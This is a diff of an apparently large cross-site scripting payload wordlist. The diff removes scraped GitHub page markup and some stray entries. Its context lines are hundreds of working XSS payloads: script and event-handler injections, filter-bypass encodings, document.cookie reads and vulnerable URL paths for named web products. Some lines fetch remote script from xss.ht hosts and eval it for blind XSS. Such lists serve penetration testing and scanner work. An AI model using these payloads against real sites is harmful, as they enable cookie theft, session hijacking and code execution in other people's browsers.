@@ -883,7 +883,6 @@
 "><script>alert(\'1\')</script>
 "><script>alert(\'\\/\\1\\/\\\')</script>
 "><script>alert(\'\\\\1\\\\\')</script>
-"><script>alert(document.domain)</script>.pl
 "><script>alert(string.fromcharcode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 "><script>alert(string.fromcharcode(75,67,70))</script>
 "><script>alert(string.fromcharcode(88,83,83))</script>
@@ -2690,7 +2689,6 @@ ${alert(1337)}`' autofocus
 -1<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
 -1<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
 -1<xml src="javascript:document.cookie=true;">
--> payload for blind xss: <script src=rohan-website.com></script>
 -alert(1)-
 -alert(1)//\
 -alert(1)}//\
@@ -2744,7 +2742,6 @@ ${alert(1337)}`' autofocus
 /admin/queues.jsp?queuefilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
 /api/jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
 /app/directives/ngmodelonblur.js
-/article.php?sid=\"><img
 /athcgi.exe?command=showpage&script='],[0,0]];alert('vulnerable');a=[['
 /cgi-bin/<img src="javascript:alert(cross_site_scripting.nasl);">.pl
 /cgi-bin/<script>cross_site_scripting.nasl</script>.pl
@@ -2771,10 +2768,8 @@ ${alert(1337)}`' autofocus
 /plugins/servlet/svnwebclient/statsitem.jsp?url=%3cscript%3ealert(document.domain)%3c%2fscript%3e
 /plugins/servlet/wallboard/?dashboardid=10000&dashboardid=10000&cycleperiod=alert(document.domain)
 /profiles.php?what=contact&author=ich&authoremail=bla%40bla.com&subject=hello&message=text&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-/screens/dashboard.html#/rogueapdetail/00:00:00:00:00:00">'><img src="xxxxx">
 /scripts/<img src="javascript:alert(cross_site_scripting.nasl);">.pl
 /scripts/<script>cross_site_scripting.nasl</script>.pl
-/secure/configureportalpages!default.jspa?view=search&searchownerusername=%3cscript%3ealert(1)%3c/script%3e&search=search
 /servlet/satellite?destpage=%22%3ch1xxx%3cscriptalert(1)%3c%2fscript&pagename=openmarket%2fxcelerate%2fuiframework%2floginerror
 /src/app/directives/ngmodelonblur.js
 /status%3e%3cscript%3ealert(31337)%3c%2fscript%3e
@@ -2872,7 +2867,6 @@ ${alert(1337)}`' autofocus
 <! xss="><img src=xx:x onerror=confirm(1)//">
 <!'/!"/!\'/\"/--!><input/type=text autofocus */; onfocus=(confirm)(document.cookie) //>
 <!'/*"/*/'/*/"/*--></script><image srcset=k */; onerror=confirm`1` //>
-<!-- '"` --><!-- </textarea></xmp> --></option></form><form id="custom-scopes-dialog-form" data-turbo="false" action="/search/custom_scopes" accept-charset="utf-8" method="post"><input type="hidden" data-csrf="true" name="authenticity_token" value="zqx59cccrtj6efifpczym4foq/+qa3xv4rpr1u1wqz1gk9ypwxssb8r2gmhp+xbwmlovs/jxscfjpnjt13nl4g==" />
 <!-- -- --><script>alert('xss');</script><!-- -- -->
 <!-- -- --><script>alert(1);</script>
 <!-- -- --><script>document.cookie=true;</script><!-- -- -->
@@ -5101,7 +5095,6 @@ ${alert(1337)}`' autofocus
 <body background=javascript:'"><script>alert(xss)</script>></body>
 <body background=javascript:alert(/xss/)></body>
 <body background=”javascript:alert(‘xss’)”>
-<body class="logged-out env-production page-responsive" style="word-wrap: break-word;">
 <body contenteditable onbeforeinput=alert(1)>test
 <body draggable="true" ondrag="alert(1)" style=display:block>test</body>
 <body draggable="true" ondrag="alert(1)">test</body>
@@ -10825,7 +10818,6 @@ ${alert(1337)}`' autofocus
 <input draggable="true" ondragstart="alert(1)" style=display:block>test</input>
 <input draggable="true" ondragstart="alert(1)">test</input>
 <input formaction=javascript:confirm(document.cookie)>
-<input id="query-builder-test" name="query-builder-test" value="" autocomplete="off" type="text" role="combobox" spellcheck="false" aria-expanded="false" aria-describedby="validation-9965eeb1-b872-4a2b-acf8-1fd3571f6880" data-target="query-builder.input" data-action="
 <input id="sender" name="sender" value="" tabindex="1" /><br />
 <input id="website" name="website" value="" tabindex="3" /><br />
 <input id=11 name=s value=`aa`onclick=alert(/xss/)>
@@ -10840,7 +10832,6 @@ ${alert(1337)}`' autofocus
 <input id=x><input id=x><script>confirm(x)</script>
 <input id=xss onblur=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus><input autofocus>
 <input id=xss onfocus=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
-<input name="include_email" id="include_email" aria-label="include my email address so i can be contacted" class="form-control mr-2" type="checkbox">
 <input name="injected" value="injected" dirname="password" />
 <input name="password" type="password" value="secret" />
 <input name="secret" type="password">
@@ -10926,8 +10917,6 @@ ${alert(1337)}`' autofocus
 <input type="file" name="file" id="file" />
 <input type="hidden" class="js-support" name="javascript-support" value="unknown">
 <input type="hidden" class="js-webauthn-support" name="webauthn-support" value="unknown">
-<input type="hidden" data-csrf="true" value="73ang8f19hq+pndp0urrxepje6qe2qenfrdsujw24ylbkh/cmnzdwa4dvgmi6oftrzqgyofjqtrk2sy3mbvp6a==" />
-<input type="hidden" id="custom_scope_id" name="custom_scope_id" data-target="custom-scopes.customscopesidfield">
 <input type="hidden" name="anon" value=0 />
 <input type="hidden" name="client_id" id="client_id" autocomplete="off" class="form-control" />
 <input type="hidden" name="integration" id="integration" autocomplete="off" class="form-control" />
@@ -14425,63 +14414,6 @@ ${alert(1337)}`' autofocus
 <script charset="\x22>javascript:alert(1)</script>
 <script charset>alert(1);</script charset>
 <script contenteditable onbeforeinput=alert(1)>test
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_ajax-error_ts-app_assets_modules_github_behaviors_include-87a4ae-21948f72ce0b.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_commenting_edit_ts-app_assets_modules_github_behaviors_ht-83c235-e429cff6ceb1.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_behaviors_task-list_ts-app_assets_modules_github_sso_ts-ui_packages-900dde-768abe60b1f8.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_blob-anchor_ts-ui_packages_code-nav_code-nav_ts-ui_packages_filter--8253c1-91468a3354f9.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/app_assets_modules_github_sticky-scroll-into-view_ts-3e000c5d31a9.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/behaviors-3852665e5a2d.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/code-menu-1c0aedc134b1.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/element-registry-ec1308f4ab2b.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/environment-f04cb2a9fc8c.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/github-elements-e73c59eabd5a.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/keyboard-shortcuts-dialog-ac448fe050d6.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-global-01e85cd1be94.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/notifications-subscriptions-menu-58a0c58bfee4.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/octicons-react-611691cca2f6.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/primer-react-d4f7d0473d87.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-code-view-afe496c1a06b.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-core-fc4d97cf677f.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/react-lib-f1bca44e0926.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/sessions-730dca81d0a2.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_aria-live_aria-live_ts-ui_packages_promise-with-resolvers-polyfill_promise-with-r-17c672-34345cb18aac.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-canonical-object_ts-ui_packages_code-view-shared_utili-04c5c0-190ff749ae90.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_code-view-shared_hooks_use-file-page-payload_ts-ui_packages_hydro-analytics_hydro-fedf97-6005b51c40ca.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_commit-attribution_index_ts-ui_packages_commit-checks-status_index_ts-ui_packages-762eaa-c6c7f3dd0990.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_diffs_diff-parts_ts-ui_packages_use-file-tree-tooltip_use-file-tree-tooltip_ts-ui-db0a92-6a1f23f93999.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_failbot_failbot_ts-4600dbf2d60a.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_paths_index_ts-fbc7ec7c14f9.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ref-selector_refselector_tsx-7496afc3784d.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_ui-commands_ui-commands_ts-97496b0f52ba.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/ui_packages_updatable-content_updatable-content_ts-2a55124d5c52.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_braintree_browser-detection_dist_browser-detection_js-node_modules_githu-bb80ec-72267f4e3ff9.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_color-convert_index_js-e3180fe3bcb3.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_delegated-events_dist_index_js-node_modules_github_catalyst_lib_index_js-f6223d90c7ba.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_dompurify_dist_purify_es_mjs-dd1d3ea6a436.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_emotion_is-prop-valid_dist_emotion-is-prop-valid_esm_js-node_modules_emo-62da9f-2df2f32ec596.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_arianotify-polyfill_arianotify-polyfill_js-node_modules_github_mi-3abb8f-d7e6bc799724.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_auto-complete-element_dist_index_js-node_modules_github_catalyst_-8e9f78-a74b4e0a8a6b.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_file-attachment-element_dist_index_js-node_modules_primer_view-co-c44a69-8094ee2ecc5e.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_filter-input-element_dist_index_js-node_modules_github_remote-inp-b5f1d7-a1760ffda83d.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_hydro-analytics-client_dist_analytics-client_js-node_modules_gith-40531a-09af0ef9a562.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_markdown-toolbar-element_dist_index_js-ceef33f593fa.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_github_catalyst_lib_inde-dbbea9-26cce2010167.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_morphdom_dist_morphdom-e-7c534c-a4a1922eb55f.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_mini-throttle_dist_index_js-node_modules_stacktrace-parser_dist_s-e7dcdd-f7cc96ebae76.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_quote-selection_dist_index_js-node_modules_github_session-resume_-69cfcc-bc42a18e77d5.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_relative-time-element_dist_index_js-f6da4b3fa34c.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-893f9f-6cf3320416b8.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_remote-form_dist_index_js-node_modules_delegated-events_dist_inde-94fd67-56e2d9924e94.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_selector-observer_dist_index_esm_js-f690fd9ae3d5.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_text-expander-element_dist_index_js-78748950cb0c.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_github_turbo_dist_turbo_es2017-esm_js-e3cbe28f1638.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lit-html_lit-html_js-be8cb88f481b.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__baseisequal_js-8929eb9718d5.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_lodash-es__stack_js-node_modules_lodash-es__uint8array_js-node_modules_l-4faaa6-4a736fde5c2f.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover-fn_js-55fea94174bf.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_oddbird_popover-polyfill_dist_popover_js-9da652f58479.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/vendors-node_modules_primer_behaviors_dist_esm_index_mjs-0dbb79f97f8f.js"></script>
-<script crossorigin="anonymous" defer="defer" type="application/javascript" src="https://github.githubassets.com/assets/wp-runtime-5c3636a4c411.js"></script>
 <script crossorigin>alert(1);</script>
 <script draggable="true" ondrag="alert(1)" style=display:block>test</script>
 <script draggable="true" ondrag="alert(1)">test</script>
@@ -14676,9 +14608,7 @@ ${alert(1337)}`' autofocus
 <script src=https://www.google.com/complete/search?client=chrome%26jsonp=alert(1);></script>
 <script src=https://zero.xss.ht?<b>
 <script src=javascript:alert(1)>
-<script type="application/json" data-target="react-partial.embeddeddata">{"props":{"docsurl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
 <script type="application/json" data-target="react-partial.embeddeddata">{"props":{}}</script>
-<script type="application/json" id="client-env">{"locale":"en","featureflags":["a11y_quote_reply_fix","contentful_lp_optimize_image","contentful_lp_hero_video_cover_image","copilot_immersive_file_preview","copilot_immersive_plugin_system","copilot_new_references_ui","copilot_chat_repo_custom_instructions_preview","copilot_chat_immersive_subthreading","copilot_chat_shared_chat_input","copilot_no_floating_button","copilot_smell_icebreaker_ux","copilot_read_shared_conversation","dotcom_chat_client_side_skills","experimentation_azure_variant_endpoint","failbot_handle_non_errors","geojson_azure_maps","ghost_pilot_confidence_truncation_25","ghost_pilot_confidence_truncation_40","github_models_o3_mini_streaming","hovercard_accessibility","insert_before_patch","issues_react_remove_placeholders","issues_react_blur_item_picker_on_close","marketing_pages_search_explore_provider","react_data_router_pull_requests","remove_child_patch","sample_network_conn_type","swp_enterprise_contact_form","site_proxima_australia_update","issues_react_create_milestone","issues_react_cache_fix_workaround","lifecycle_label_name_updates","copilot_task_oriented_assistive_prompts"]}</script>
 <script type="text/javascript">
 <script type="text/javascript"></script>
 <script type="text/javascript">window.open("http://127.0.0.1:3555/xss_serve_payloads/x.html","_self");</script>
@@ -14936,7 +14866,6 @@ ${alert(1337)}`' autofocus
 <script>confirm(string.fromcharcode(88,83,83));</script>
 <script>confirm(x.y.x.y.x.y[0]);confirm(x.x.x.x.x.x.x.x.x.y.x.y.x.y[0]);</script>
 <script>confirm(x.y[0])</script>
-<script>cross_site_scripting.nasl</script>.pl
 <script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
 <script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>
 <script>d.innerhtml+='';</script>
@@ -14989,7 +14918,6 @@ ${alert(1337)}`' autofocus
 <script>eval(‘al’+’ert(1)’);</script>
 <script>eval.call`${'prompt\x281)'}`</script>
 <script>execscript(“msgbox 1”,”vbscript”);</script>
-<script>foo</script>
 <script>for((i)in(self))eval(i)(1)</script>
 <script>for(var i=0;i>=0;i++){alert(math.random()); alert(document.cookie);}</script>
 <script>function b(){eval(this.responsetext)};a=new xmlhttprequest();a.addeventlistener("load", b);a.open("get", "//hackeroneofjaaah.xss.ht");a.send();</script>
@@ -20455,7 +20383,6 @@ ${alert(1337)}`' autofocus
 \x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
 ]><img />//["'`-->]]>]</div>
 ^alert(1)^
-___iframe src=_ javascript_alert('xss');__.xml
 ___img onload=prompt(1)_.zip
 _mem_bin/formslogin.asp?\"><script>alert('vulnerable')</script>
 `"'><img src='#\x27 onerror=javascript:alert(1)>
@@ -20520,7 +20447,6 @@ a-onmouseout.xml
 a-onmouseover.xml
 a-onmouseup.xml
 a.jsp/<script>alert('vulnerable')</script>
-a.jsp/<script>alert(document.domain)</script>
 a29b1%3balert(888)//a62b7156d82
 a=";get";;&;#10;b=";url(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';xss';);";)";;&#10;eval(a+b+c+d);
 a="get";&#10;b="url("";&#10;c="javascript:";&#10;d="alert('xss');")";eval(a+b+c+d);
@@ -20632,22 +20558,16 @@ acart2_0/error.asp?msg=<script>alert(\"test\")</script>
 acart2_0/signin.asp?msg=<script>alert(\"test\")</script>
 accountlogin_onmousedown
 accountlogin_onmouseup
-acs/..;/admin/public/login.jsp?error=%3cscript%3ealert(document.domain)%3c/script%3e
 actionmouse
 activity_nonfocusingscrollview.xml
 add name <script>alert('vl')</script>
 add topic <iframe src=http://www.vulnerability-lab.com>
 add user <script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
 add.php3?url=ja&adurl=javascript:<script>alert('vulnerable')</script>
-addons/?q=%3csvg%2fonload%3dalert(1)%3e
 addressbook.php?\"><script>alert(vulnerable)</script><!--
 addressbook/index.php?name=<script>alert('vulnerable')</script>
 addressbook/index.php?surname=<script>alert('vulnerable')</script>
 addyoursite.php?catid=&lt;script&gt;javascript:alert('vulnerable');&lt;/script&gt;
-adframe.php?refresh=hostmarker:portmarker'<script>alert(document.cookie)</script>
-adm_program/system/redirect.php?url=javascript://%250aalert(document.domain)
-admin/public/login.jsp?error=%3cscript%3ealert(document.domain)%3c/script%3e
-admin/queues.jsp?queuefilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
 administrator/gallery/gallery.php?directory=\"<script>alert(document.cookie)</script>
 administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>
 administrator/gallery/uploadimage.php?directory=\"<script>alert(document.cookie)</script>
@@ -20690,12 +20610,7 @@ alert(string.fromcharcode(75,67,70))//";alert(string.fromcharcode(75,67,70))//--
 alert(string.fromcharcode(88,83,83))//";alert(string.fromcharcode(88,83,83))//--
 alert(string.fromcharcode(88,83,83));'))">
 alert(this["\x64\x6f\x63\x75\x6d\x65\x6e\x74" ]["cook" + ([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]])
-amazon/search.php?query=1<script>alert(document.cookie);</script>&mode=all
 amazonblurb
-amcharts/amcolumn/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
-amcolumn/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
-amcolumn/amcolumn/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
-amcolumn/examples/amcolumn/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
 antispam/listdel?file=blacklist&name=b<script>alert('vulnerable')</script>&startline=0
 antispam/listdel?file=whitelist&name=a<script>alert('vulnerable')</script>&startline=0(naturally)
 antonmouse
@@ -20703,9 +20618,6 @@ antonmouse1984
 anyonmouse
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 anythinglr00</script><script>alert(document.domain)</script>uxldz
-api/jolokia/read<svg%20onload=alert(document.domain)>?mimetype=text/html
-api/jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
-appliance/login.ns?login%5bpassword%5d=test%22%3e%3csvg/onload=alert(document.domain)%3e&login%5buse_curr%5d=1&login%5bsubmit%5d=change%20password
 apps/web/index.fcgi?servers=&section=<script>alert(document.cookie)</script>
 apps/web/vs_diag.cgi?server=<script>alert('vulnerable')</script>
 area-onblur.xml
@@ -20720,36 +20632,20 @@ as a side note, this was also effective against a real world xss filter i came a
 ascript:alert('wxss');"">"
 asfunction:geturl,javascript:alert(1)//
 asp trick: ?input1=<script/&in%u2119ut1=>al%u0117rt('1')</script> by @irsdl
-assets/editor/image effects/cameramotionblureditor.js
-assets/scripts/amcolumn.swf?chart_settings=<settings></settings>&chart_data=<chart><message><![cdata[<a+href=\"javascript:alert(1)\">click</a>]]></message></chart>&.swf
 astnode.operator='(window.x?void0:(window.x=true,alert(1)))+';
 athcgi.exe?command=showpage&script='],[0,0]];alert('vulnerable');a=[['
 auction/auction.cgi?action=sort_page&view=search&page=0&cat_id=&lang=english&search=all&terms=<script>alert('vulnerable');</script>&where=&sort=photo&dir=
-auth/login?to=/92874%27;alert(document.domain)//280
-auth_changepassword.php?ref=%22%3e%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
 avascript&#00058;alert(1)
-avatar_uploader.pages.inc?file=%3cscript%3ealert(document.domain)%3c%2fscript%3e
-awstats/awredir.pl?url=%3cscript%3ealert(document.domain)%3c/script%3e
 a{b:`function(){alert(1)}()`;}
 a{xxx:expression(if(!window.x){alert('xss');window.x=1;})}
 background-image: url(javascript:prompt(1))
-badging/badge_template_v0.php?layout=1&type="/><svg/onload="alert(document.domain)"/>
-basiccombopopup$invocationmousehandler.class
-basiccombopopup$invocationmousehandler.h
-basiccombopopup$invocationmousemotionhandler.class
-basiccombopopup$invocationmousemotionhandler.h
 basiccombopopup.invocationmousehandler
 basiccombopopup.invocationmousemotionhandler
 bb000001.pl<script>alert('vulnerable')</script>
-bbs/check_user_id.php?user_id=<script>foo</script>
-bbs/new.php?darkmode=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 behaviour:url\0028javascript:alert\0028[0][0]\0029\0029
 betsie/parserl.pl/<script>alert('vulnerable')</script>;
 betsie/parserl.pl/<script>alert('xss')</script>;
-bibliopac/bin/wxis.exe/bibliopac/?isisscript=bibliopac/bin/bibliopac.xic&db="><script>prompt(document.domain)</script>
 bin/wcm/contentfinder/connector/suggestions.json/a.html?query_term=path%3a/&pre=%3csvg+onload%3dalert(document.domain)%3e&post=yyyy
-bitrix/components/bitrix/mobileapp.list/ajax.php/?=&ajax_call=y&items%5bitems%5d%5bbottom%5d%5bleft%5d=&items%5bitems%5d%5btogglable%5d=test123&=&items%5bitems%5d%5bid%5d=%3cimg+src=%22//%0d%0a)%3b//%22%22%3e%3cdiv%3ex%0d%0a%7d)%3bvar+bx+=+window.bx%3bwindow.bx+=+function(node,+bcache)%7b%7d%3bbx.ready+=+function(handler)%7b%7d%3bfunction+__mobileapplist(test)%7balert(document.domain)%3b%7d%3b//%3c/div%3e
-bitrix/components/bitrix/mobileapp.list/ajax.php/?=&ajax_call=y&items%5bitems%5d%5bbottom%5d%5bleft%5d=&items%5bitems%5d%5btogglable%5d=test123&=&items%5bitems%5d%5bid%5d=<a+href="/*">*/%29%7d%29;function+__mobileapplist()%7balert(1)%7d//>
 blackonblur
 blur:query-builder#clearbuttonblur
 body { background: url("javascript:alert(1)"); }
@@ -20773,41 +20669,19 @@ button_onmousedown.xml
 button_onmouseup.xml
 buttonfocused.xml
 buttonmousecontrol
-buttonmousecontrol.ino
-buttonmousecontrol.txt
 c%00""<script>alert(0);</script>
 c="javascript:";
 ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog%2f
 ca000007.pl?action=showcart&refpage=\"><script>alert('vulnerable')</script>
 caframe_onmousewheel
 calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
-calendar/calendar_form.php/"><script>alert(document.domain)</script>
-calendarexpress/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
-cameramotionblur.cs
-cameramotionblur.cs.meta
-cameramotionblur.js
-cameramotionblur.js.meta
-cameramotionblur.shader
-cameramotionblur.shader.meta
-cameramotionblurdx11.shader
-cameramotionblurdx11.shader.meta
-cameramotionblureditor.cs
-cameramotionblureditor.cs.meta
-cameramotionblureditor.js
 canonfocus
-carbon/admin/login.jsp?loginstatus=false&errorcode=%27);alert(document.domain)//
-carbon/admin/login.jsp?msgid=%27%3balert(%27nuclei%27)%2f%2f
 catego<script
 ceframe_onmousewheel
-cfide/debug/cf_debugfr.cfm?userpage=javascript:alert(1)
-cfide/wizards/common/_logintowizard.cfm?%22%3e%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
-cfusion/debug/cf_debugfr.cfm?userpage=javascript:alert(1)
 cgi-bin/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('vulnerable')>
 cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('vulnerable')</script>
-cgi-bin/<script>cross_site_scripting.nasl</script>.pl
 cgi-bin/athcgi.exe?command=showpage&script='],[0,0]];alert('vulnerable');a=[['
 cgi-bin/auction/auction.cgi?action=sort_page&view=search&page=0&cat_id=&lang=english&search=all&terms=<script>alert('vulnerable');</script>&where=&sort=photo&dir=
-cgi-bin/awstats/awredir.pl?url=%3cscript%3ealert(document.domain)%3c/script%3e
 cgi-bin/betsie/parserl.pl/<script>alert('vulnerable')</script>;
 cgi-bin/cgicso?query=<script>alert('vulnerable')</script>
 cgi-bin/cvsblame.cgi?file=<script>alert('vulnerable')</script>
@@ -20823,7 +20697,6 @@ cgi-bin/fom.cgi?file=<script>alert('vulnerable')</script>
 cgi-bin/fom/fom.cgi?cmd=<script>alert('vulnerable')</script>&file=1&keywords=vulnerable
 cgi-bin/formmail.cgi?<script>alert(\"vulnerable\");</script>
 cgi-bin/login.pl?course_id=\">&lt;script&gt;alert('vulnerable')&lt;/script&gt;
-cgi-bin/luci/site_access/?url=%22%20onfocus=alert(document.domain)%20autofocus=1
 cgi-bin/search.php?searchstring=<script>alert(document.cookie)</script>
 cgi-bin/search.pl?realm=all&match=0&terms=test&nocpp=1&maxhits=10&;rank=<script>alert('vulnerable')</script>
 cgi-bin/showcheckins.cgi?person=<script>alert('vulnerable')</script>
@@ -20851,7 +20724,6 @@ charset=utf- 32&v=%e2%88%80%e3%b8%80%e3%b0%80script%e3%b8%80alert(1)%e3%b0%80/sc
 chat/register.php?register=yes&username=overg&email=<script>alert%20(\"vulnerable\")</script>&email1=<script>alert%20(\"vulnerable\")</script>
 chatframechannelchangeresizebutton_onmousedown
 chatframechannelchangeresizebutton_onmouseup
-check_user_id.php?user_id=<script>foo</script>
 class x {public static function main() { flash.lib.geturl(new flash.net.urlrequest(flash.lib._root.url||"javascript:alert(1)"),flash.lib._root.name||"_top"); }}
 classic ie backtick dom xss: <img src="xx:x" alt="``onerror=alert(1)"><script>document.body.innerhtml=''</script>
 cleartrust/ct_logon.asp?ctloginerrormsg=<script>alert(1)</script>
